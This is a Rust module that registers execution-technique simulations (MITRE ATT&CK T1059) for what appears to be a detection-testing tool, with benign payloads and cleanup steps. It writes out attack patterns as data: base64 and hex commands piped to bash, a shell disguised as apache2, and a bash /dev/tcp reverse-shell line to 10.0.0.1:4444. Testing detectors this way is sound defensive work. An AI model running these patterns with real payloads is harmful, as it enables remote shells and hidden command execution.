//! TA0002: Execution technique simulations.

use crate::framework::{AttackSimulation, AttackSimulator, SimulationExecution, Tactic};
use std::sync::Arc;

pub fn register(simulator: &mut AttackSimulator) {
    // T1059.004 - Unix Shell
    simulator.register(AttackSimulation {
        id: "exec-001".to_string(),
        name: "Unix Shell Command Execution".to_string(),
        technique_id: "T1059.004".to_string(),
        tactic: Tactic::Execution,
        description: "Execute commands via bash".to_string(),
        expected_alert: "Shell execution detected".to_string(),
        should_detect: false,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec!["echo 'normal command'".to_string()],
            cleanup: vec![],
            artifacts: vec![],
        }),
    });

    // T1059.004 - Base64 encoded command
    simulator.register(AttackSimulation {
        id: "exec-002".to_string(),
        name: "Base64 Encoded Command".to_string(),
        technique_id: "T1059.004".to_string(),
        tactic: Tactic::Execution,
        description: "Execute base64-encoded command".to_string(),
        expected_alert: "Encoded command execution detected".to_string(),
        should_detect: true,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec!["echo 'aWQ=' | base64 -d | bash".to_string()],
            cleanup: vec![],
            artifacts: vec![],
        }),
    });

    // T1059.004 - Hex encoded command
    simulator.register(AttackSimulation {
        id: "exec-003".to_string(),
        name: "Hex Encoded Command".to_string(),
        technique_id: "T1059.004".to_string(),
        tactic: Tactic::Execution,
        description: "Execute hex-encoded command via xxd".to_string(),
        expected_alert: "Encoded command execution detected".to_string(),
        should_detect: true,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec!["echo '6964' | xxd -r -p | bash 2>/dev/null || true".to_string()],
            cleanup: vec![],
            artifacts: vec![],
        }),
    });

    // T1059.004 - Web server spawning shell
    simulator.register(AttackSimulation {
        id: "exec-004".to_string(),
        name: "Web Server Spawning Shell (Webshell Pattern)".to_string(),
        technique_id: "T1059.004".to_string(),
        tactic: Tactic::Execution,
        description: "Shell spawned by process named like web server".to_string(),
        expected_alert: "Suspicious parent-child process relationship".to_string(),
        should_detect: true,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec![
                r#"(exec -a apache2 bash -c 'bash -c "id"') &"#.to_string(),
                "sleep 0.5".to_string(),
            ],
            cleanup: vec!["pkill -f 'apache2.*bash' 2>/dev/null || true".to_string()],
            artifacts: vec![],
        }),
    });

    // T1059.006 - Python execution
    simulator.register(AttackSimulation {
        id: "exec-005".to_string(),
        name: "Python Script Execution".to_string(),
        technique_id: "T1059.006".to_string(),
        tactic: Tactic::Execution,
        description: "Execute Python with suspicious imports".to_string(),
        expected_alert: "Suspicious Python execution".to_string(),
        should_detect: true,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec![
                r#"python3 -c 'import socket,subprocess,os; print("test")' 2>/dev/null || true"#
                    .to_string(),
            ],
            cleanup: vec![],
            artifacts: vec![],
        }),
    });

    // T1059.004 - Reverse shell pattern (not connecting)
    simulator.register(AttackSimulation {
        id: "exec-006".to_string(),
        name: "Reverse Shell Pattern".to_string(),
        technique_id: "T1059.004".to_string(),
        tactic: Tactic::Execution,
        description: "Create file with reverse shell syntax".to_string(),
        expected_alert: "Reverse shell pattern detected".to_string(),
        should_detect: true,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec![
                r#"echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > /tmp/winncore-revshell-test.sh"#
                    .to_string(),
            ],
            cleanup: vec!["rm -f /tmp/winncore-revshell-test.sh".to_string()],
            artifacts: vec!["/tmp/winncore-revshell-test.sh".to_string()],
        }),
    });

    // T1059.004 - Process substitution
    simulator.register(AttackSimulation {
        id: "exec-007".to_string(),
        name: "Process Substitution Execution".to_string(),
        technique_id: "T1059.004".to_string(),
        tactic: Tactic::Execution,
        description: "Execute via bash process substitution".to_string(),
        expected_alert: "Unusual process execution pattern".to_string(),
        should_detect: true,
        requires_root: false,
        executor: Arc::new(|| SimulationExecution {
            commands: vec!["bash <(echo 'echo test')".to_string()],
            cleanup: vec![],
            artifacts: vec![],
        }),
    });
}
